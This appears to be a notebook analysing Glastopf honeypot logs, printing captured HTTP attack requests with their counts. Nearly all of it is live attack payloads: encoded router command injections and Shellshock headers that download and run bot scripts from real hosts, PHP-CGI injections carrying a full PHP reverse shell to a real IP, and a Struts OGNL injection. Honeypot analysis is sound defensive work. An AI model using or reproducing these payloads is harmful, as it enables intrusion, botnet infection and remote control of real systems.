# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1033\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%61%39%61%66%66%33%30%65%20%68%74%74%70%3a%2f%2f%36%39%2e%31%37%2e%32%35%33%2e%31%35%30%3a%33%32%30%30%22%20%3e%3e%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%61%39%61%66%66%33%30%65%22%20%3e%3e%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%61%39%61%66%66%33%30%65%22%20%3e%3e%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%61%39%61%66%66%33%30%65%22%20%3e%3e%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%61%39%61%66%66%33%30%65%2e%73%68%3b%2e%2f%2e%61%39%61%66%66%33%30%65%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1039\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%62%37%63%65%38%33%37%65%20%68%74%74%70%3a%2f%2f%31%34%38%2e%32%34%34%2e%31%31%34%2e%32%34%30%3a%33%32%30%30%22%20%3e%3e%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%62%37%63%65%38%33%37%65%22%20%3e%3e%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%62%37%63%65%38%33%37%65%22%20%3e%3e%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%62%37%63%65%38%33%37%65%22%20%3e%3e%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%62%37%63%65%38%33%37%65%2e%73%68%3b%2e%2f%2e%62%37%63%65%38%33%37%65%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1033\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%63%39%38%37%65%30%33%65%20%68%74%74%70%3a%2f%2f%39%38%2e%31%35%39%2e%38%31%2e%31%33%37%3a%33%32%30%30%22%20%3e%3e%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%63%39%38%37%65%30%33%65%22%20%3e%3e%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%63%39%38%37%65%30%33%65%22%20%3e%3e%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%63%39%38%37%65%30%33%65%22%20%3e%3e%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%63%39%38%37%65%30%33%65%2e%73%68%3b%2e%2f%2e%63%39%38%37%65%30%33%65%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 2195\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php system("wget 194.60.242.251/minispeedtest/speedtest/.z/hb/php01 -O /tmp/.0e1bc.log;perl /tmp/.0e1bc.log 85.214.73.166;rm -rf /tmp/.0e1bc.log &"); ?>set_time_limit(0);\n$ip = '91.121.105.21';\n$port = 22;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can't fork");\n\t\texit(1);\n\t}\n\tif ($pid) {\n\t\texit(0);\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can't setsid()");\n\t\texit(1);\n\t}\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.");\n}\nchdir("/");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n$descriptorspec = array(\n   0 => array("pipe", "r"),\n   1 => array("pipe", "w"),\n   2 => array("pipe", "w")\n);\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n\tprintit("ERROR: Can't spawn shell");\n\texit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\n";\n\t}\n}\nexit(1);\n?>    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 844\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%31%34%39%2e%31%32%39%2e%32%30%2e%38%36%3a%33%33%34%33%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST //cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1\r\nContent-Length: 220\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: -h\r\n\r\n<? system("cd /var/tmp; wget ftp://upload:upload@61.93.167.28/upload/play.jpg -O /var/tmp/play.jpg; curl -O ftp://upload:upload@61.93.167.28/upload/play.jpg -O /var/tmp/play.jpg; perl /var/tmp/play.jpg;rm -rf *.jpg"); ?>    1
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 2171\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php system("wget 208.85.177.238/.x/hb/php02 -O /tmp/.bash_h1s7;perl /tmp/.bash_h1s7 85.214.73.166;rm -rf /tmp/.bash_h1s7 &"); ?>set_time_limit(0);\n$ip = '91.121.105.21';\n$port = 22;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can't fork");\n\t\texit(1);\n\t}\n\tif ($pid) {\n\t\texit(0);\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can't setsid()");\n\t\texit(1);\n\t}\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.");\n}\nchdir("/");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n$descriptorspec = array(\n   0 => array("pipe", "r"),\n   1 => array("pipe", "w"),\n   2 => array("pipe", "w")\n);\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n\tprintit("ERROR: Can't spawn shell");\n\texit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\n";\n\t}\n}\nexit(1);\n?>    1
# POST /admin/index.action HTTP/1.1\r\nAccept: */*\r\nContent-Length: 395\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0\r\n\r\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}    1
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 2292\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 162.197.24.67\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php\nset_time_limit(0);\n$ip = '162.213.25.66';\n$port = 3133;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'unset HISTFILE; unset HISTSIZE;killall -9 perl;wget -q http://162.213.25.66/bot.pl -P /tmp;perl /tmp/bot.pl;uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\nif (function_exists('pcntl_fork')) {\n   $pid = pcntl_fork();    \n   if ($pid == -1) {\n       printit("ERROR: Can't fork");\n       exit(1);\n   }\n   if ($pid) {\n       exit(0);\n   }\n   if (posix_setsid() == -1) {\n       printit("Error: Can't setsid()");\n       exit(1);\n   }\n   $daemon = 1;\n} else {\n   printit("WARNING: Failed to daemonise.");\n}\nchdir("/");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n   printit("$errstr ($errno)");\n   exit(1);\n}\n$descriptorspec = array(\n   0 => array("pipe", "r"),\n   1 => array("pipe", "w"),\n   2 => array("pipe", "w")\n);\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n   printit("ERROR: Can't spawn shell");\n   exit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nwhile (1) {\n   if (feof($sock)) {\n       printit("ERROR: Shell connection terminated");\n       break;\n   }\n   if (feof($pipes[1])) {\n       printit("ERROR: Shell process terminated");\n       break;\n   }\n   $read_a = array($sock, $pipes[1], $pipes[2]);\n   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n   if (in_array($sock, $read_a)) {\n       if ($debug) printit("SOCK READ");\n       $input = fread($sock, $chunk_size);\n       if ($debug) printit("SOCK: $input");\n       fwrite($pipes[0], $input);\n   }\n   if (in_array($pipes[1], $read_a)) {\n       if ($debug) printit("STDOUT READ");\n       $input = fread($pipes[1], $chunk_size);\n       if ($debug) printit("STDOUT: $input");\n       fwrite($sock, $input);\n   }\n   if (in_array($pipes[2], $read_a)) {\n       if ($debug) printit("STDERR READ");\n       $input = fread($pipes[2], $chunk_size);\n       if ($debug) printit("STDERR: $input");\n       fwrite($sock, $input);\n   }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit ($string) {\n   if (!$daemon) {\n       print "$string\n";\n   }\n}\nexit(1);\n?>    1
# Length: 87, dtype: int64

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('wget')]['request_raw'].value_counts()
# Out:
# POST //cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1\r\nContent-Length: 210\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: -c\r\n\r\n<? system("cd /tmp;wget http://pisosdemaderaw.com.mx/sekip/sekip.php;wget http://escoladeradio.com.br/website/wp-content/themes/radio/includes/new.txt;perl new.txt;rm -rf new.txt;rm -rf new.txt.*;rm -rf *"); ?>    3
# GET /cgi-bin/learn-message.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi-bin/login.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi/close_window.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /webmail/login.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi-bin/guestbook.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi-bin/awstats.pl HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi-mod/view_help.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 160\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php\n system(" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd "); ?>    2
# GET /cgi-bin/fire.cgi HTTP/1.0\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;}; /bin/bash -c "cd /var/tmp;wget http://184.171.247.165/wi;curl -O http://184.171.247.165/wi;perl wi;rm -rf wi"    2
# GET /guestbook.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /cgi-bin/upload.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /iControl/iControlPortal.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET /webnovel/books.cgi HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\r\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2
# GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://gilbertsoto.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://gilbertsoto.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'    1
# ...
# GET /cgi-sys/defaultwebpage.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://gilbertsoto.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://gilbertsoto.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*");'    1
# GET /cgi-bin/login.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
# GET /cgi-bin/php5 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://tecnoalianza.com/hs.txt -O /tmp/hs.txt;curl -O /tmp/hs.txt http://tecnoalianza.com/hs.txt;perl /tmp/hs.txt;rm -rf /tmp/hs.txt*");'    1
